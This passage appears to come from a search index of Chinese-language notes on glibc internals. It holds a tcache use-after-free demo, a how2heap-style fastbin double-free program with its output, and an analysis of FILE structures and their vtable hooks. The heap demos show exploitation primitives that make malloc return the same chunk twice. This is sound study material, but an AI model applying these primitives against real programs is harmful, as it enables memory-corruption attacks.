<p>\u200b\u8f93\u51fa\u200b\uff1a</p> <pre><code>tcache is at 0x56359aa16010\nafter free(p1):\ntcache bin #1: 0x56359aa166e0\nafter free(p2):\ntcache bin #1: 0x56359aa16710 -&gt; 0x56359aa166e0\nafter use after free:\ntcache bin #1: 0x56359aa16710 -&gt; 0x56359aa162a0\nafter malloc(p3):\ntcache bin #1: 0x56359aa162a0\nafter malloc(p4):\np0=0x56359aa162a0 p1=0x56359aa166e0 p2=0x56359aa16710 p3=0x56359aa16710 p4=0x56359aa162a0\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b malloc \u200b\u51fa\u6765\u200b\u7684\u200b\u4e24\u4e2a\u200b\u6307\u9488\u200b <code>p0</code> \u200b\u548c\u200b <code>p4</code> \u200b\u662f\u200b\u76f8\u540c\u200b\u7684\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#duplicate-chunks-in-fast-bin","title":"duplicate chunks in fast bin","text":"<p>\u200b\u6839\u636e\u200b\u524d\u9762\u200b\u7684\u200b\u5206\u6790\u200b\uff0cfast bin \u200b\u5bf9\u200b double free \u200b\u7684\u200b\u68c0\u6d4b\u200b\u6bd4\u8f83\u200b\u5f31\u200b\uff0c\u200b\u5982\u679c\u200b\u6784\u9020\u200b\u4e00\u79cd\u200b\u60c5\u51b5\u200b\uff0c\u200b\u8ba9\u200b\u5b83\u200b\u65e0\u6cd5\u200b\u88ab\u200b\u68c0\u6d4b\u200b\u5230\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u88ab\u200b\u63d2\u5165\u200b fast bin \u200b\u4e24\u6b21\u200b\uff0c\u200b\u6b64\u540e\u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u5206\u914d\u200b\u4e24\u6b21\u200b\uff1a</p> <pre><code>// see also: https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_dup.c\n#include &lt;stddef.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct malloc_chunk {\n  size_t mchunk_prev_size; /* Size of previous chunk (if free).  */\n  size_t mchunk_size;      /* Size in bytes, including overhead. */\n\n  struct malloc_chunk *fd; /* double links -- used only if free. */\n  struct malloc_chunk *bk;\n\n  /* Only used for large blocks: pointer to next larger size.  */\n  struct malloc_chunk *fd_nextsize; /* double links -- used only if free. */\n  struct malloc_chunk *bk_nextsize;\n};\n\n/* offset 2 to use otherwise unindexable first 2 bins */\n#define fastbin_index(sz) ((((unsigned int)(sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)\n\n#define INTERNAL_SIZE_T size_t\n\n#define MALLOC_ALIGNMENT                                                       \\\n  (2 * SIZE_SZ &lt; __alignof__(long double) ? __alignof__(long double)           \\\n                                          : 2 * SIZE_SZ)\n\n/* The corresponding word size.  */\n#define SIZE_SZ (sizeof(INTERNAL_SIZE_T))\n\n/* The corresponding bit mask value.  */\n#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)\n\n/* The smallest possible chunk */\n#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))\n\n/* The smallest size we can malloc is an aligned minimal chunk */\n#define MINSIZE                                                                \\\n  (unsigned long)(((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))\n\n#define request2size(req)                                                      \\\n  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                             \\\n       ? MINSIZE                                                               \\\n       : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)\n\n#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)\n\n#define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)\n\nstruct malloc_state {\n  /* Serialize access.  */\n  int mutex;\n  /* Flags (formerly in max_fast).  */\n  int flags;\n  /* Set if the fastbin chunks contain recently inserted free blocks.  */\n  /* Note this is a bool but not all targets support atomics on booleans.  */\n  int have_fastchunks;\n  /* Fastbins */\n  struct malloc_chunk *fastbinsY[NFASTBINS];\n};\n\nvoid dump_fastbin() {\n  void *libc_base = (char *)stdout - 0x1ed6a0; // offset of _IO_2_1_stdout_\n  struct malloc_state *main_arena =\n      libc_base +\n      0x1ecb80; // offset of main_arena, found by decompiling malloc_trim\n  for (int i = 0; i &lt; NFASTBINS; i++) {\n    if (main_arena-&gt;fastbinsY[i]) {\n      struct malloc_chunk *p = main_arena-&gt;fastbinsY[i];\n      struct malloc_chunk *init_p = p;\n      printf(\"fastbin #%d: %p\", i, p);\n      p = p-&gt;fd;\n      while (p) {\n        printf(\" -&gt; %p\", p);\n        if (p == init_p) {\n          printf(\" (cycle detected)\");\n          break;\n        }\n        p = p-&gt;fd;\n      }\n      printf(\"\\n\");\n    }\n  }\n}\n\nint main() {\n  // use 7 malloc + free to fill the tcache\n  void *ptrs[7];\n  printf(\"allocate 7 pointers:\");\n  for (int i = 0; i &lt; 7; i++) {\n    ptrs[i] = malloc(32);\n    printf(\" %p\", ptrs[i]);\n  }\n  printf(\"\\n\");\n\n  void *p1 = malloc(32);\n  void *p2 = malloc(32);\n  printf(\"allocate p1=%p p2=%p\\n\", p1, p2);\n\n  for (int i = 0; i &lt; 7; i++) {\n    free(ptrs[i]);\n  }\n\n  // now p1 goes to fastbin\n  free(p1);\n\n  printf(\"fastbins after p1 freed:\\n\");\n  dump_fastbin();\n\n  // now p2 goes to fastbin\n  free(p2);\n\n  // two pointers in the fastbin\n  printf(\"fastbins after p1 &amp; p2 freed:\\n\");\n\n  dump_fastbin();\n\n  // free p1 again\n  free(p1);\n\n  // three pointers in the fastbin\n  printf(\"fastbins after p1, p2 &amp; p1 freed:\\n\");\n  dump_fastbin();\n\n  // allocate 7 pointers to clear tcache\n  printf(\"allocate 7 pointers\\n\");\n  for (int i = 0; i &lt; 7; i++) {\n    ptrs[i] = malloc(32);\n  }\n\n  p1 = malloc(32);\n  p2 = malloc(32);\n  void *p3 = malloc(32);\n  printf(\"allocate p1=%p p2=%p p3=%p\\n\", p1, p2, p3);\n  return 0;\n}\n</code></pre> <p>\u200b\u7531\u4e8e\u200b fast bin \u200b\u7684\u200b double free \u200b\u68c0\u67e5\u200b\u53ea\u200b\u68c0\u67e5\u200b\u94fe\u8868\u200b\u5934\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6309\u7167\u200b <code>p1, p2, p1</code> \u200b\u7684\u200b\u987a\u5e8f\u200b\u91ca\u653e\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u68c0\u67e5\u200b\u5230\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6b64\u65f6\u200b\u94fe\u8868\u200b\u4e2d\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e24\u6b21\u200b <code>p1</code>\uff0c\u200b\u90a3\u4e48\u200b\u540e\u7eed\u200b\u518d\u200b\u5206\u914d\u5185\u5b58\u200b\u65f6\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u628a\u200b\u540c\u4e00\u4e2a\u200b\u5730\u5740\u200b\u5206\u914d\u200b\u4e86\u200b\u4e24\u6b21\u200b\u3002\u200b\u4e0a\u8ff0\u200b\u4ee3\u7801\u200b\u7684\u200b\u8f93\u51fa\u200b\u5982\u4e0b\u200b\uff0c\u200b\u7b26\u5408\u200b\u9884\u671f\u200b\uff1a</p> <pre><code>allocate 7 pointers: 0x5633121676b0 0x5633121676e0 0x563312167710 0x563312167740 0x563312167770 0x5633121677a0 0x5633121677d0\nallocate p1=0x563312167800 p2=0x563312167830\nfastbins after p1 freed:\nfastbin #1: 0x5633121677f0\nfastbins after p1 &amp; p2 freed:\nfastbin #1: 0x563312167820 -&gt; 0x5633121677f0\nfastbins after p1, p2 &amp; p1 freed:\nfastbin #1: 0x5633121677f0 -&gt; 0x563312167820 -&gt; 0x5633121677f0 (cycle detected)\nallocate 7 pointers\nallocate p1=0x563312167800 p2=0x563312167830 p3=0x563312167800\n</code></pre> <p>\u200b\u53ef\u89c1\u200b double free \u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u80fd\u200b\u88ab\u200b\u68c0\u6d4b\u200b\u5230\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u80fd\u200b\u5e26\u6765\u200b\u5371\u9669\u200b\u7684\u200b\u540e\u679c\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#_10","title":"\u53c2\u8003","text":"<ul> <li>Malloc Internals</li> </ul>"},{"location":"software/glibc_file.html","title":"glibc FILE \u200b\u7ed3\u6784\u200b\u4f53","text":"<p>glibc 2.31 \u200b\u662f\u200b ubuntu 20.04 \u200b\u6240\u200b\u4f7f\u7528\u200b\u7684\u200b libc \u200b\u7248\u672c\u200b\uff0c\u200b\u672c\u6587\u200b\u57fa\u4e8e\u200b\u8fd9\u4e2a\u200b\u7248\u672c\u200b\u7684\u200b\u4ee3\u7801\u200b\u8fdb\u884c\u200b\u5206\u6790\u200b\uff0c\u200b\u6e90\u7801\u200b\u53ef\u4ee5\u200b\u4ece\u200b glibc-2.31 tag \u200b\u4e2d\u200b\u627e\u5230\u200b\u3002</p>"},{"location":"software/glibc_file.html#file","title":"FILE \u200b\u7ed3\u6784\u200b\u4f53\u200b\u5b9a\u4e49","text":"<p>FILE \u200b\u7ed3\u6784\u200b\u4f53\u200b\u5b9a\u4e49\u200b\u5728\u200b <code>libio/bits/types/FILE.h</code> \u200b\u4e2d\u200b\uff0c\u200b\u662f\u200b\u4e2a\u200b\u5bf9\u200b <code>_IO_FILE</code> \u200b\u7684\u200b typedef\uff0c\u200b\u800c\u200b <code>_IO_FILE</code> \u200b\u5b9a\u4e49\u200b\u5728\u200b <code>libio/bits/types/struct_FILE.h</code> \u200b\u4e2d\u200b\uff1a</p> <pre><code>typedef struct _IO_FILE FILE;\n\nstruct _IO_FILE\n{\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  char *_IO_read_ptr;   /* Current read pointer */\n  char *_IO_read_end;   /* End of get area. */\n  char *_IO_read_base;  /* Start of putback+get area. */\n  char *_IO_write_base; /* Start of put area. */\n  char *_IO_write_ptr;  /* Current put pointer. */\n  char *_IO_write_end;  /* End of put area. */\n  char *_IO_buf_base;   /* Start of reserve area. */\n  char *_IO_buf_end;    /* End of reserve area. */\n\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n  int _flags2;\n  __off_t _old_offset; /* This used to be _offset but it's too small.  */\n\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  _IO_lock_t *_lock;\n  __off64_t _offset;\n  /* Wide character stream stuff.  */\n  struct _IO_codecvt *_codecvt;\n  struct _IO_wide_data *_wide_data;\n  struct _IO_FILE *_freeres_list;\n  void *_freeres_buf;\n  size_t __pad5;\n  int _mode;\n  /* Make sure we don't get into trouble again.  */\n  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];\n};\n</code></pre> <p>\u200b\u5b9e\u9645\u4e0a\u200b\uff0cFILE \u200b\u901a\u5e38\u200b\u8fd8\u4f1a\u200b\u5e26\u200b\u4e00\u4e2a\u200b\u5c3e\u90e8\u200b\u7684\u200b vtable\uff0c\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u51fd\u6570\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u6210\u4e3a\u200b <code>_IO_FILE_plus</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\uff1a</p> <pre><code>struct _IO_FILE_plus\n{\n  FILE file;\n  const struct _IO_jump_t *vtable;\n};\n</code></pre> <p>stdin/stdout/stderr \u200b\u90fd\u200b\u662f\u200b\u8fd9\u4e2a\u200b\u7ed3\u6784\u200b\u4f53\u200b\u7684\u200b\u7c7b\u578b\u200b\uff1a</p> <pre><code>// libio/libio.h\nextern struct _IO_FILE_plus _IO_2_1_stdin_;\nextern struct _IO_FILE_plus _IO_2_1_stdout_;\nextern struct _IO_FILE_plus _IO_2_1_stderr_;\n\n// libio/stdio.c\nFILE *stdin = (FILE *) &amp;_IO_2_1_stdin_;\nFILE *stdout = (FILE *) &amp;_IO_2_1_stdout_;\nFILE *stderr = (FILE *) &amp;_IO_2_1_stderr_;\n</code></pre> <p>\u200b\u7528\u200b <code>fopen</code> \u200b\u5206\u914d\u200b\u51fa\u6765\u200b\u7684\u200b <code>FILE</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b <code>struct locked_FILE</code> \u200b\u7c7b\u578b\u200b\uff0c\u200b\u8fd4\u56de\u200b\u7684\u200b <code>FILE *</code> \u200b\u6307\u5411\u200b\u5b83\u200b\u7684\u200b <code>fp.file</code> \u200b\u6210\u5458\u200b\uff1a</p> <pre><code>struct locked_FILE\n{\n  struct _IO_FILE_plus fp;\n  _IO_lock_t lock;\n  struct _IO_wide_data wd;\n};\n</code></pre>"},{"location":"software/glibc_file.html#_1","title":"\u7f13\u51b2\u533a\u200b\u64cd\u4f5c","text":"<p>FILE \u200b\u7ed3\u6784\u200b\u4f53\u200b\u7ef4\u62a4\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7f13\u51b2\u533a\u200b\uff1a<code>_IO_buf_base</code> \u200b\u5230\u200b <code>_IO_buf_end</code>\uff0c\u200b\u91cc\u9762\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u7f13\u5b58\u200b\u7684\u200b\u6570\u636e\u200b\uff1b\u200b\u4e3a\u4e86\u200b\u4ece\u200b\u7f13\u51b2\u533a\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u6216\u8005\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u5230\u200b\u7f13\u51b2\u533a\u200b\uff0c\u200b\u989d\u5916\u200b\u7ef4\u62a4\u200b\u4e86\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u7684\u200b\u6307\u9488\u200b\uff1a</p> <ul> <li>\u200b\u8bfb\u200b\uff1a<code>_IO_read_ptr</code> \u200b\u6307\u5411\u200b\u7f13\u51b2\u533a\u200b\u4e2d\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u8bfb\u53d6\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\uff0c<code>_IO_read_end</code> \u200b\u6307\u5411\u200b\u7f13\u51b2\u533a\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b\u7684\u200b\u8303\u56f4\u200b\u7684\u200b\u7ed3\u5c3e\u200b</li> <li>\u200b\u5199\u200b\uff1a<code>_IO_write_ptr</code> \u200b\u6307\u5411\u200b\u7f13\u51b2\u533a\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u5199\u5165\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c<code>_IO_write_end</code> \u200b\u6307\u5411\u200b\u7f13\u51b2\u533a\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u5199\u5165\u200b\u7684\u200b\u8303\u56f4\u200b\u7684\u200b\u7ed3\u5c3e\u200b</li> </ul>"},{"location":"software/glibc_file.html#getc","title":"getc","text":"<p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u8bfb\u53d6\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b <code>_IO_read_ptr &lt; _IO_read_end</code>\uff0c\u200b\u53ef\u4ee5\u200b\u4ece\u200b <code>_IO_read_ptr</code> \u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u5e76\u200b\u66f4\u65b0\u200b <code>_IO_read_ptr</code> \u200b\u6307\u9488\u200b\u5373\u53ef\u200b\uff0c\u200b\u6b63\u5982\u200b <code>getc</code> \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>#define __getc_unlocked_body(_fp)                   \\\n  (__glibc_unlikely ((_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end)    \\\n   ? __uflow (_fp) : *(unsigned char *) (_fp)-&gt;_IO_read_ptr++)\n</code></pre>"},{"location":"software/glibc_file.html#uflow","title":"uflow","text":"<p>\u200b\u4f46\u200b\u5982\u679c\u200b\u7f13\u51b2\u533a\u200b\u4e2d\u200b\u6ca1\u6709\u200b\u53ef\u4ee5\u200b\u8bfb\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5373\u200b <code>_IO_read_ptr &gt;= _IO_read_end</code>\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u628a\u200b\u66f4\u200b\u591a\u200b\u6570\u636e\u200b\u8bfb\u53d6\u200b\u5230\u200b buffer \u200b\u4e2d\u200b\uff0c\u200b\u518d\u200b\u83b7\u53d6\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\u200b\u8fd9\u200b\u662f\u200b\u5728\u200b <code>__uflow</code> \u200b\u51fd\u6570\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u8c03\u7528\u200b FILE \u200b\u7ed3\u6784\u200b\u4f53\u200b\u7684\u200b vtable \u200b\u7684\u200b uflow hook\uff0c\u200b\u9ed8\u8ba4\u200b\u6307\u5411\u200b\u4e86\u200b <code>_IO_default_uflow</code> \u200b\u51fd\u6570\u200b\uff1a</p> <pre><code>int\n_IO_default_uflow (FILE *fp)\n{\n  int ch = _IO_UNDERFLOW (fp);\n  if (ch == EOF)\n    return EOF;\n  return *(unsigned char *) fp-&gt;_IO_read_ptr++;\n}\n</code></pre> <p>\u200b\u5b83\u4f1a\u200b\u7ee7\u7eed\u200b\u8c03\u7528\u200b vtable \u200b\u7684\u200b underflow hook\uff0c\u200b\u7136\u540e\u200b\u8fd4\u56de\u200b <code>_IO_read_ptr</code> \u200b\u6307\u5411\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u5b57\u7b26\u200b\uff0c\u200b\u6240\u4ee5\u200b uflow \u200b\u5c31\u662f\u200b underflow \u200b\u7684\u200b\u7279\u6b8a\u200b\u60c5\u51b5\u200b\uff0c\u200b\u7528\u4e8e\u200b getc \u200b\u7684\u200b\u573a\u666f\u200b\u3002</p>"},{"location":"software/glibc_file.html#underflow","title":"underflow","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u770b\u200b underflow hook \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u7684\u200b underflow hook \u200b\u662f\u200b <code>_IO_new_file_underflow</code> \u200b\u51fd\u6570\u200b\uff1a</p> <pre><code>int\n_IO_new_file_underflow (FILE *fp)\n{\n  ssize_t count;\n\n  /* C99 requires EOF to be \"sticky\".  */\n  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)\n    return EOF;\n\n  if (fp-&gt;_flags &amp; _IO_NO_READS)\n    {\n      fp-&gt;_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return EOF;\n    }\n  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)\n    return *(unsigned char *) fp-&gt;_IO_read_ptr;\n\n  if (fp-&gt;_IO_buf_base == NULL)\n    {\n      /* Maybe we already have a push back pointer.  */\n      if (fp-&gt;_IO_save_base != NULL)\n        {\n          free (fp-&gt;_IO_save_base);\n          fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;\n        }\n      _IO_doallocbuf (fp);\n    }\n\n  /* FIXME This can/should be moved to genops ?? */\n  if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))\n    {\n      /* We used to flush all line-buffered stream.  This really isn't\n         required by any standard.  My recollection is that\n         traditional Unix systems did this for stdout.  stderr better\n         not be line buffered.  So we do just that here\n         explicitly.  --drepper */\n      _IO_acquire_lock (stdout);\n\n      if ((stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))\n          == (_IO_LINKED | _IO_LINE_BUF))\n        _IO_OVERFLOW (stdout, EOF);\n\n      _IO_release_lock (stdout);\n    }\n\n  _IO_switch_to_get_mode (fp);\n\n  /* This is very tricky. We have to adjust those\n     pointers before we call _IO_SYSREAD () since\n     we may longjump () out while waiting for\n     input. Those pointers may be screwed up. H.J. */\n  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;\n  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;\n  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end\n    = fp-&gt;_IO_buf_base;\n\n  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,\n                       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);\n  if (count &lt;= 0)\n    {\n      if (count == 0)\n        fp-&gt;_flags |= _IO_EOF_SEEN;\n      else\n        fp-&gt;_flags |= _IO_ERR_SEEN, count = 0;\n  }\n  fp-&gt;_IO_read_end += count;\n  if (count == 0)\n    {\n      /* If a stream is read to EOF, the calling application may switch active\n         handles.  As a result, our offset cache would no longer be valid, so\n         unset it.  */\n      fp-&gt;_offset = _IO_pos_BAD;\n      return EOF;\n    }\n  if (fp-&gt;_offset != _IO_pos_BAD)\n    _IO_pos_adjust (fp-&gt;_offset, count);\n  return *(unsigned char *) fp-&gt;_IO_read_ptr;\n}\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6838\u5fc3\u200b\u601d\u8def\u200b\u5c31\u662f\u200b\u901a\u8fc7\u200b <code>read</code> \u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u8bfb\u53d6\u200b\u66f4\u200b\u591a\u200b\u6570\u636e\u200b\uff0c\u200b\u628a\u200b\u6570\u636e\u200b\u4fdd\u5b58\u200b\u5230\u200b <code>_IO_buf_base</code> \u200b\u6307\u5411\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6307\u9488\u200b <code>_IO_read_ptr</code> \u200b\u6307\u5411\u200b buffer \u200b\u7684\u200b\u5f00\u5934\u200b <code>_IO_buf_base</code>\uff0c<code>_IO_read_end</code> \u200b\u6307\u5411\u200b buffer \u200b\u4e2d\u200b\u5df2\u200b\u8bfb\u53d6\u6570\u636e\u200b\u7684\u200b\u7ed3\u5c3e\u200b\uff1a<code>_IO_buf_base</code>\u3002</p>"},{"location":"software/glibc_file.html#_2","title":"\u7f13\u51b2\u533a\u200b\u521d\u59cb\u5316","text":"<p>\u200b\u90a3\u4e48\u200b\u7f13\u51b2\u533a\u200b\u662f\u200b\u600e\u4e48\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u5462\u200b\uff1f\u200b\u4e0a\u9762\u200b\u7684\u200b underflow hook \u200b\u4ee3\u7801\u200b\u91cc\u200b\uff0c\u200b\u5f53\u200b buffer \u200b\u4e3a\u200b NULL \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u901a\u8fc7\u200b <code>_IO_doallocbuf</code> \u200b\u51fd\u6570\u200b\u6765\u200b\u521d\u59cb\u5316\u200b\u7f13\u51b2\u533a\u200b\uff1a</p> <pre><code>void\n_IO_doallocbuf (FILE *fp)\n{\n  if (fp-&gt;_IO_buf_base)\n    return;\n  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0)\n    if (_IO_DOALLOCATE (fp) != EOF)\n      return;\n  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);\n}\n</code></pre> <p>\u200b\u5982\u679c\u200b\u8fd9\u4e2a\u200b stream \u200b\u662f\u200b unbuffered\uff08\u200b\u4f8b\u5982\u200b stderr\uff09\uff0c\u200b\u5b83\u200b\u5c31\u200b\u4f1a\u200b\u628a\u200b buffer \u200b\u6307\u5411\u200b FILE \u200b\u7ed3\u6784\u200b\u4f53\u200b\u81ea\u5df1\u200b\u7684\u200b <code>char _shortbuf[1]</code> \u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u91cc\u9762\u200b\u53ea\u80fd\u200b\u4fdd\u5b58\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u6709\u200b\u7a7a\u95f4\u200b\u4fdd\u5b58\u200b <code>ungetc</code> \u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5426\u5219\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u8c03\u7528\u200b doallocate hook\uff0c\u200b\u9ed8\u8ba4\u200b\u6307\u5411\u200b <code>_IO_file_doallocate</code> \u200b\u51fd\u6570\u200b\uff1a</p> <pre><code>int\n_IO_file_doallocate (FILE *fp)\n{\n  size_t size;\n  char *p;\n  struct stat64 st;\n\n  size = BUFSIZ;\n  if (fp-&gt;_fileno &gt;= 0 &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), 0) &gt;= 0)\n    {\n      if (S_ISCHR (st.st_mode))\n        {\n          /* Possibly a tty.  */\n          if (\n#ifdef DEV_TTY_P\n              DEV_TTY_P (&amp;st) ||\n#endif\n              local_isatty (fp-&gt;_fileno))\n            fp-&gt;_flags |= _IO_LINE_BUF;\n        }\n#if defined _STATBUF_ST_BLKSIZE\n      if (st.st_blksize &gt; 0 &amp;&amp; st.st_blksize &lt; BUFSIZ)\n        size = st.st_blksize;\n#endif\n    }\n  p = malloc (size);\n  if (__glibc_unlikely (p == NULL))\n    return EOF;\n  _IO_setb (fp, p, p + size, 1);\n  return 1;\n}\n</code></pre> <p>\u200b\u5373\u200b\u901a\u8fc7\u200b malloc \u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u7f13\u51b2\u533a\u200b\u3002</p>"},{"location":"software/glibc_file.html#putc","title":"putc","text":"<p>\u200b\u521a\u624d\u200b\u8bb2\u5230\u200b\u4e86\u200b getc \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0cputc \u200b\u7684\u200b\u5b9e\u73b0\u200b\u5219\u200b\u662f\u200b\u5728\u200b <code>_IO_write_ptr &lt; _IO_write_end</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u628a\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5230\u200b <code>_IO_write_ptr</code> \u200b\u5e76\u200b\u66f4\u65b0\u200b\uff1a</p> <pre><code>#define __putc_unlocked_body(_ch, _fp)                  \\\n  (__glibc_unlikely ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)  \\\n   ? __overflow (_fp, (unsigned char) (_ch))                \\\n   : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))\n</code></pre>"},{"location":"software/glibc_file.html#overflow","title":"overflow","text":"<p>\u200b\u540c\u6837\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u7f13\u51b2\u533a\u200b\u5df2\u6ee1\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u8c03\u7528\u200b overflow \u200b\u51fd\u6570\u200b\u6765\u200b\u5904\u7406\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u7684\u200b overflow hook \u200b\u5b9e\u73b0\u200b\u662f\u200b <code>_IO_new_file_overflow</code> \u200b\u51fd\u6570\u200b\uff1a</p> <pre><code>int\n_IO_new_file_overflow (FILE *f, int ch)\n{\n  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */\n    {\n      f-&gt;_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return EOF;\n    }\n  /* If currently reading or no buffer allocated. */\n  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)\n    {\n      /* Allocate a buffer if needed. */\n      if (f-&gt;_IO_write_base == NULL)\n        {\n          _IO_doallocbuf (f);\n          _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\n        }\n      /* Otherwise must be currently reading.\n         If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\n         logically slide the buffer forwards one block (by setting the\n         read pointers to all point at the beginning of the block).  This\n         makes room for subsequent output.\n         Otherwise, set the read pointers to _IO_read_end (leaving that\n         alone, so it can continue to correspond to the external position). */\n      if (__glibc_unlikely (_IO_in_backup (f)))\n        {\n          size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;\n          _IO_free_backup_area (f);\n          f-&gt;_IO_read_base -= MIN (nbackup,\n                                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);\n          f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;\n        }\n\n      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)\n        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;\n      